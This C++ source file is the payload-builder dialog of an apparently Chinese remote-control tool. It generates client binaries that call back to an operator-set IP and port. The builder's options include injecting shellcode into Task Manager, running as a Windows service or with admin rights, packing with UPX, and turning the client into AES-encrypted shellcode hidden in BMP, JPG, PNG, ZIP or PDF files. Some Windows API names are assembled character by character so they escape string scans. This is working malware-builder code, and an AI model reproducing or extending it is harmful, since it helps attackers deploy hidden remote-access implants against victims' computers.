// BuildDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "BuildDlg.h"
#include "afxdialogex.h"
#include <io.h>
#include "InputDlg.h"
#include <bcrypt.h>
#include <wincrypt.h>
// #include <ntstatus.h>

enum Index {
    IndexTestRun_DLL,
    IndexTestRun_MemDLL,
    IndexTestRun_InjSC,
    IndexGhost,
    IndexServerDll,
    IndexTinyRun,
    IndexGhostMsc,
    IndexTestRunMsc,
    OTHER_ITEM
};

enum Payload {
    Payload_Self,
    Payload_Raw,
    Payload_BMP,
    Payload_JPG,
    Payload_PNG,
    Payload_ZIP,
    Payload_PDF,
};

// CBuildDlg 对话框

IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)

std::string GetMasterId();

std::string GetPwdHash();

int MemoryFind(const char *szBuffer, const char *Key, int iBufferSize, int iKeySize);

LPBYTE ReadResource(int resourceId, DWORD &dwSize)
{
    dwSize = 0;
    auto id = resourceId;
    HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCE(id), "BINARY");
    if (hResource == NULL) {
        return NULL;
    }
    // 获取资源的大小
    dwSize = SizeofResource(NULL, hResource);

    // 加载资源
    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (hLoadedResource == NULL) {
        return NULL;
    }
    // 锁定资源并获取指向资源数据的指针
    LPVOID pData = LockResource(hLoadedResource);
    if (pData == NULL) {
        return NULL;
    }
    auto r = new BYTE[dwSize];
    memcpy(r, pData, dwSize);

    return r;
}


CBuildDlg::CBuildDlg(CWnd* pParent)
    : CDialog(CBuildDlg::IDD, pParent)
    , m_strIP(_T(""))
    , m_strPort(_T(""))
    , m_strFindden(FLAG_FINDEN)
    , m_sGroupName(_T("default"))
    , m_strEncryptIP(_T("是"))
{

}

CBuildDlg::~CBuildDlg()
{
}

void CBuildDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
    DDX_Text(pDX, IDC_EDIT_IP, m_strIP);
    DDX_Text(pDX, IDC_EDIT_PORT, m_strPort);
    DDX_Control(pDX, IDC_COMBO_EXE, m_ComboExe);
    DDX_Control(pDX, IDC_STATIC_OTHER_ITEM, m_OtherItem);
    DDX_Control(pDX, IDC_COMBO_BITS, m_ComboBits);
    DDX_Control(pDX, IDC_COMBO_RUNTYPE, m_ComboRunType);
    DDX_Control(pDX, IDC_COMBO_PROTO, m_ComboProto);
    DDX_Control(pDX, IDC_COMBO_ENCRYPT, m_ComboEncrypt);
    DDX_Control(pDX, IDC_COMBO_COMPRESS, m_ComboCompress);
    DDX_Control(pDX, IDC_EDIT_GROUPNAME, m_EditGroup);
    DDX_Text(pDX, IDC_EDIT_GROUPNAME, m_sGroupName);
    DDV_MaxChars(pDX, m_sGroupName, 23);
    DDX_Control(pDX, IDC_COMBO_PAYLOAD, m_ComboPayload);
    DDX_Control(pDX, IDC_STATIC_PAYLOAD, m_StaticPayload);
}


BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
    ON_BN_CLICKED(IDOK, &CBuildDlg::OnBnClickedOk)
    ON_CBN_SELCHANGE(IDC_COMBO_EXE, &CBuildDlg::OnCbnSelchangeComboExe)
    ON_COMMAND(ID_HELP_PARAMETERS, &CBuildDlg::OnHelpParameters)
    ON_COMMAND(ID_HELP_FINDDEN, &CBuildDlg::OnHelpFindden)
    ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
    ON_COMMAND(ID_CLIENT_RUNAS_ADMIN, &CBuildDlg::OnClientRunasAdmin)
    ON_CBN_SELCHANGE(IDC_COMBO_COMPRESS, &CBuildDlg::OnCbnSelchangeComboCompress)
END_MESSAGE_MAP()


// CBuildDlg 消息处理程序

std::string ReleaseUPX();
void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress);

bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer,
                   int ulOriginalLength, bool align = false);

BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size, LONGLONG offset = 0);

std::string ReleaseEXE(int resID, const char* name)
{
    DWORD dwSize = 0;
    LPBYTE data = ReadResource(resID, dwSize);
    if (!data)
        return "";

    char path[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string curExe = path;
    GET_FILEPATH(path, name);
    BOOL r = WriteBinaryToFile(path, (char*)data, dwSize);
    SAFE_DELETE_ARRAY(data);

    return r ? path : "";
}

typedef struct SCInfo {
    unsigned char aes_key[16];
    unsigned char aes_iv[16];
    unsigned char *data;
    int len;
    int offset;
    char file[_MAX_PATH];
} SCInfo;

#define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)

bool MYLoadLibrary(const char* name)
{
    char kernel[] = { 'k','e','r','n','e','l','3','2',0 };
    char load[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
    typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
    if (!GetModuleHandleA(name)) {
        LoadLibraryF LoadLibraryA = (LoadLibraryF)GetAddr(kernel, load);
        return LoadLibraryA(name);
    }
    return true;
}

void generate_random_iv(unsigned char* iv, size_t len)
{
    typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
    typedef NTSTATUS(WINAPI* BCryptGenRandomF)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
    char crypt[] = { 'b','c','r','y','p','t',0 };
    char name[] = { 'B','C','r','y','p','t','G','e','n','R','a','n','d','o','m',0 };
    MYLoadLibrary(crypt);
    BCryptGenRandomF BCryptGenRandom = (BCryptGenRandomF)GetAddr(crypt, name);
    BCryptGenRandom(NULL, iv, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

ULONGLONG GetFileSize(const char* path)
{
	std::ifstream file(path, std::ios::binary | std::ios::ate);

	if (!file) {
		Mprintf("Failed to open file: %s.\n", path);
		return 0;
	}

	ULONGLONG size = file.tellg();
	file.close();

	return size;
}

void CBuildDlg::OnBnClickedOk()
{
    UpdateData(TRUE);
    if (m_strIP.IsEmpty() || atoi(m_strPort) <= 0)
        return;

    BYTE* szBuffer = NULL;
    DWORD dwFileSize = 0;
    int index = m_ComboExe.GetCurSel(), typ=index;
    int is64bit = m_ComboBits.GetCurSel() == 0;
    if (index == IndexTestRun_InjSC && !is64bit) {
        MessageBox("Shellcode 只能向64位电脑注入，注入器也只能是64位!", "提示", MB_ICONWARNING);
        return;
    }
    int startup = Startup_DLL;
    CString file;
    switch (index) {
    case IndexTestRun_DLL:
    case IndexTestRun_MemDLL:
    case IndexTestRun_InjSC:
        file = "TestRun.exe";
        typ = index == IndexTestRun_DLL ? CLIENT_TYPE_DLL : CLIENT_TYPE_MEMDLL;
        startup = std::map<int, int> {
            {IndexTestRun_DLL, Startup_DLL},{IndexTestRun_MemDLL, Startup_MEMDLL},{IndexTestRun_InjSC, Startup_InjSC},
        } [index];
        szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
        break;
    case IndexGhost:
        file = "ghost.exe";
        typ = CLIENT_TYPE_ONE;
        szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
        break;
    case IndexGhostMsc:
        file = "ghost.exe";
        typ = CLIENT_TYPE_ONE;
        startup = Startup_GhostMsc;
        szBuffer = ReadResource(is64bit ? IDR_GHOST_X64 : IDR_GHOST_X86, dwFileSize);
        break;
    case IndexTestRunMsc:
        file = "TestRun.exe";
        typ = CLIENT_TYPE_MEMDLL;
        startup = Startup_TestRunMsc;
        szBuffer = ReadResource(is64bit ? IDR_TESTRUN_X64 : IDR_TESTRUN_X86, dwFileSize);
        break;
    case IndexServerDll:
        file = "ServerDll.dll";
        typ = CLIENT_TYPE_DLL;
        szBuffer = ReadResource(is64bit ? IDR_SERVERDLL_X64 : IDR_SERVERDLL_X86, dwFileSize);
        break;
    case IndexTinyRun:
        file = "TinyRun.dll";
        typ = CLIENT_TYPE_SHELLCODE;
        szBuffer = ReadResource(is64bit ? IDR_TINYRUN_X64 : IDR_TINYRUN_X86, dwFileSize);
        break;
    case OTHER_ITEM: {
        m_OtherItem.GetWindowTextA(file);
        typ = -1;
        if (file != "未选择文件") {
            CFile File;
            File.Open(file, CFile::modeRead | CFile::typeBinary);
            dwFileSize = File.GetLength();
            if (dwFileSize > 0) {
                szBuffer = new BYTE[dwFileSize];
                File.Read(szBuffer, dwFileSize);
            }
            File.Close();
        }
        break;
    }
    default:
        break;
    }
    if (szBuffer == NULL) {
        MessageBox("出现内部错误，请检查输入，重新编译程序!", "提示", MB_ICONWARNING);
        return;
    }
    //////////上线信息//////////////////////
    CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "", typ, false, DLL_VERSION, 0, startup, HeaderEncV0 };
    if(m_strFindden.GetLength())
        memcpy(g_ConnectAddress.szFlag, m_strFindden.GetBuffer(), min(sizeof(g_ConnectAddress.szFlag), m_strFindden.GetLength()));
    g_ConnectAddress.SetAdminId(GetMasterHash().c_str());
    g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));
    g_ConnectAddress.runningType = m_ComboRunType.GetCurSel();
    g_ConnectAddress.protoType = m_ComboProto.GetCurSel();
    g_ConnectAddress.iHeaderEnc = m_ComboEncrypt.GetCurSel();
    memcpy(g_ConnectAddress.pwdHash, GetPwdHash().c_str(), sizeof(g_ConnectAddress.pwdHash));
    memcpy(g_ConnectAddress.szGroupName, m_sGroupName, m_sGroupName.GetLength());

    if (!g_ConnectAddress.IsValid()) {
        SAFE_DELETE_ARRAY(szBuffer);
        return;
    }
    bool encrypt = m_strEncryptIP == _T("是");
    if (encrypt && startup != Startup_InjSC && index != IndexTinyRun)
        g_ConnectAddress.Encrypt();
    if (m_runasAdmin)
        g_ConnectAddress.runasAdmin = TRUE;
    try {
        // 更新标识
        char* ptr = (char*)szBuffer, *end = (char*)szBuffer + dwFileSize;
        bool bFind = false;
        int bufSize = dwFileSize;
        while (ptr < end) {
            int iOffset = MemoryFind(ptr, (char*)g_ConnectAddress.Flag(), bufSize, g_ConnectAddress.FlagLen());
            if (iOffset == -1)
                break;

            CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
            auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
            if (result > 0) {
                MessageBox("客户端版本比主控程序更高, 无法生成!\r\n" + file, "提示", MB_ICONWARNING);
                return;
            }
            if (result != -2 && result <= 0) { // 客户端版本不能不大于主控端
                bFind = true;
                auto master = GetMasterId();
                memcpy(ptr + iOffset, &(g_ConnectAddress.ModifyFlag(master.c_str())), sizeof(g_ConnectAddress));
            }
            ptr += iOffset + sizeof(g_ConnectAddress);
            bufSize -= iOffset + sizeof(g_ConnectAddress);
        }
        if (!bFind) {
            MessageBox("出现内部错误，未能找到标识信息!\r\n" + file, "提示", MB_ICONWARNING);
            SAFE_DELETE_ARRAY(szBuffer);
            return;
        }

        // 保存文件
        char path[_MAX_PATH], * p = path;
        GetModuleFileNameA(NULL, path, sizeof(path));
        while (*p) ++p;
        while ('\\' != *p) --p;
        strcpy(p + 1, file.GetString());

        CString strSeverFile = typ != -1 ? path : file;
        DeleteFileA(strSeverFile);
        CFile File;
        BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
        if (!r) {
            MessageBox("服务程序创建失败!\r\n" + strSeverFile, "提示", MB_ICONWARNING);
            SAFE_DELETE_ARRAY(szBuffer);
            return;
        }
        File.Write(szBuffer, dwFileSize);
        File.Close();
        CString tip = index == IndexTestRun_DLL ? "\r\n提示: 请生成\"ServerDll.dll\"，以便程序正常运行。" : "";
        tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。" : "";
        std::string upx;
        if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
        if (!upx.empty()) {
            run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
            MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + strSeverFile + tip, "提示", MB_ICONINFORMATION);
        } else {
            if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES) {
                DWORD dwSize = 0;
                LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, dwSize);
                if (data) {
                    int iOffset = MemoryFind((char*)data, (char*)g_ConnectAddress.Flag(), dwSize, g_ConnectAddress.FlagLen());
                    if (iOffset != -1) {
                        SCInfo* sc = (SCInfo*)(data + iOffset);
                        LPBYTE srcData = (LPBYTE)szBuffer;
                        int srcLen = dwFileSize;
                        if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
                            generate_random_iv(sc->aes_key, 16);
                            generate_random_iv(sc->aes_iv, 16);
                            std::string key, iv;
                            for (int i = 0; i < 16; ++i) key += std::to_string(sc->aes_key[i]) + " ";
                            for (int i = 0; i < 16; ++i) iv += std::to_string(sc->aes_iv[i]) + " ";
                            Mprintf("AES_KEY: %s, AES_IV: %s\n", key.c_str(), iv.c_str());

                            struct AES_ctx ctx;
                            AES_init_ctx_iv(&ctx, sc->aes_key, sc->aes_iv);
                            AES_CBC_encrypt_buffer(&ctx, srcData, srcLen);
                            sc->len = srcLen;
                            sc->offset = dwSize;
                            CString old = strSeverFile;
                            PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
                            strSeverFile.ReleaseBuffer();
                            if (strSeverFile != old) DeleteFileA(old);
							int n = m_ComboPayload.GetCurSel();
							CString payload = strSeverFile;
							if (n) {
								static std::map<int, std::string> m = {
									{ Payload_Raw, "*.bin|*.bin|"}, { Payload_BMP, "*.bmp|*.bmp|"},
									{ Payload_JPG, "*.jpg|*.jpg|"}, { Payload_PNG, "*.png|*.png|"},
									{ Payload_ZIP, "*.zip|*.zip|"}, { Payload_PDF, "*.pdf|*.pdf|"},
								};
								payload = GetFilePath(NULL, m[n].c_str(), n != Payload_Raw);
								sc->offset = n == Payload_Raw ? 0 : GetFileSize(payload);
                                strcpy(sc->file, PathFindFileNameA(payload));
								tip = payload.IsEmpty() ? "\r\n警告: 没有生成载荷!" : "\r\n提示: 载荷文件必须拷贝至程序目录。";
							}
                            BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
                            if (r) {                               
								r = WriteBinaryToFile(payload.GetString(), (char*)srcData, srcLen, n == Payload_Raw ? 0 : -1);
								if (!r) tip = "\r\n警告: 生成载荷失败!";
                            }else{
                                MessageBox("文件生成失败: \r\n" + strSeverFile, "提示", MB_ICONINFORMATION);
                            }
                            SAFE_DELETE_ARRAY(srcData);
                        }
                    }
                }
                SAFE_DELETE_ARRAY(data);
            } else if (m_ComboCompress.GetCurSel() == CLIENT_PE_TO_SEHLLCODE) {
                int pe_2_shellcode(const std::string & in_path, const std::string & out_str);
                int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
                if (ret)MessageBox(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()),
                                       "提示", MB_ICONINFORMATION);
            }
            MessageBox("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
        }
        SAFE_DELETE_ARRAY(szBuffer);
        if (index == IndexTestRun_DLL) return;
    } catch (CMemoryException* e) {
        char err[100];
        e->GetErrorMessage(err, sizeof(err));
        MessageBox("内存异常:" + CString(err), "异常", MB_ICONERROR);
    } catch (CFileException* e) {
        char err[100];
        e->GetErrorMessage(err, sizeof(err));
        MessageBox("文件异常:" + CString(err), "异常", MB_ICONERROR);
    } catch (CException* e) {
        char err[100];
        e->GetErrorMessage(err, sizeof(err));
        MessageBox("其他异常:" + CString(err), "异常", MB_ICONERROR);
    }

    SAFE_DELETE_ARRAY(szBuffer);
    CDialog::OnOK();
}

BOOL CBuildDlg::OnInitDialog()
{
    CDialog::OnInitDialog();

    // TODO:  在此添加额外的初始化
    CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_IP);
    pEdit->LimitText(99);
    m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - 磁盘DLL");
    m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - 内存DLL");
    m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - 注入任务管理器");

    m_ComboExe.InsertString(IndexGhost, "ghost.exe");
    m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
    m_ComboExe.InsertString(IndexTinyRun, "TinyRun.dll");
    m_ComboExe.InsertString(IndexGhostMsc, "ghost.exe - Windows 服务");
    m_ComboExe.InsertString(IndexTestRunMsc, "TestRun - Windows 服务");
    m_ComboExe.InsertString(OTHER_ITEM, CString("选择文件"));
    m_ComboExe.SetCurSel(IndexTestRun_MemDLL);

    m_ComboBits.InsertString(0, "64位");
    m_ComboBits.InsertString(1, "32位");
    m_ComboBits.SetCurSel(0);

    m_ComboRunType.InsertString(RUNNING_RANDOM, "随机上线");
    m_ComboRunType.InsertString(RUNNING_PARALLEL, "并发上线");
    m_ComboRunType.SetCurSel(RUNNING_RANDOM);

    m_ComboProto.InsertString(PROTO_TCP, "TCP");
    m_ComboProto.InsertString(PROTO_UDP, "UDP");
    m_ComboProto.InsertString(PROTO_HTTP, "HTTP");
    m_ComboProto.InsertString(PROTO_RANDOM, "随机");
    m_ComboProto.InsertString(PROTO_KCP, "KCP");
    m_ComboProto.SetCurSel(PROTO_TCP);

    m_ComboEncrypt.InsertString(PROTOCOL_SHINE, "Shine");
    m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
    m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);

    m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "无");
    m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
    m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
    m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
    m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);

    m_ComboPayload.InsertString(Payload_Self, "载荷写入当前程序尾部");
    m_ComboPayload.InsertString(Payload_Raw, "载荷写入单独的二进制文件");
    m_ComboPayload.InsertString(Payload_BMP, "载荷写入 BMP 格式图片");
    m_ComboPayload.InsertString(Payload_JPG, "载荷写入 JPG 格式图片");
    m_ComboPayload.InsertString(Payload_PNG, "载荷写入 PNG 格式图片");
    m_ComboPayload.InsertString(Payload_ZIP, "载荷写入 ZIP 压缩包");
    m_ComboPayload.InsertString(Payload_PDF, "载荷写入 PDF 文件");
    m_ComboPayload.SetCurSel(Payload_Self);
    m_ComboPayload.ShowWindow(SW_HIDE);
    m_StaticPayload.ShowWindow(SW_HIDE);

    m_OtherItem.ShowWindow(SW_HIDE);

    m_runasAdmin = FALSE;
    m_MainMenu.LoadMenuA(IDR_MENU_BUILD);
    CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
    SubMenu->CheckMenuItem(ID_MENU_ENCRYPT_IP, MF_CHECKED);
    SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, MF_UNCHECKED);
    ::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); // 为窗口设置菜单
    ::DrawMenuBar(this->GetSafeHwnd());                        // 显示菜单

    return TRUE;  // return TRUE unless you set the focus to a control
    // 异常: OCX 属性页应返回 FALSE
}

CString CBuildDlg::GetFilePath(CString type, CString filter, BOOL isOpen) {
	CComPtr<IShellFolder> spDesktop;
	HRESULT hr = SHGetDesktopFolder(&spDesktop);
	if (FAILED(hr)) {
		MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
		return "";
	}
	// 过滤器：显示所有文件和特定类型文件（例如文本文件）
	CFileDialog fileDlg(isOpen, type, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, filter, AfxGetMainWnd());
	int ret = 0;
	try {
		ret = fileDlg.DoModal();
	}
	catch (...) {
		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
		return "";
	}
    if (ret == IDOK) {
        CString name = fileDlg.GetPathName();
        return name;
    }
    return "";
}

void CBuildDlg::OnCbnSelchangeComboExe()
{
    auto n = m_ComboExe.GetCurSel();
    if (n == OTHER_ITEM) {
        CString name = GetFilePath(_T("dll"), _T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"));
        if (!name.IsEmpty()) {
            m_OtherItem.SetWindowTextA(name);
            CFile File;
            BOOL ret = File.Open(name, CFile::modeRead | CFile::typeBinary);
            if (ret) {
                int dwFileSize = File.GetLength();
                LPBYTE szBuffer = new BYTE[dwFileSize];
                File.Read(szBuffer, dwFileSize);
                File.Close();
                m_strIP = "127.0.0.1";
                m_strPort = "6543";
                UpdateData(FALSE);
                SAFE_DELETE_ARRAY(szBuffer);
            }
        } else {
            m_OtherItem.SetWindowTextA("未选择文件");
        }
        m_OtherItem.ShowWindow(SW_SHOW);
    } else {
        m_OtherItem.SetWindowTextA("");
        m_OtherItem.ShowWindow(SW_HIDE);
    }
}


void CBuildDlg::OnHelpParameters()
{
    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#生成参数");
    ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
}


void CBuildDlg::OnHelpFindden()
{
    CInputDialog dlg(this);
    dlg.m_str = m_strFindden;
    dlg.Init("生成标识", "请设置标识信息:");
    if (dlg.DoModal() == IDOK) {
        m_strFindden = dlg.m_str;
    }
}


void CBuildDlg::OnMenuEncryptIp()
{
    m_strEncryptIP = m_strEncryptIP == "是" ? "否" : "是";
    CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
    SubMenu->CheckMenuItem(ID_MENU_ENCRYPT_IP, m_strEncryptIP == "是" ? MF_CHECKED : MF_UNCHECKED);
}


void CBuildDlg::OnClientRunasAdmin()
{
    m_runasAdmin = !m_runasAdmin;
    CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
    SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, m_runasAdmin ? MF_CHECKED : MF_UNCHECKED);
}


void CBuildDlg::OnCbnSelchangeComboCompress()
{
    m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
	m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
}
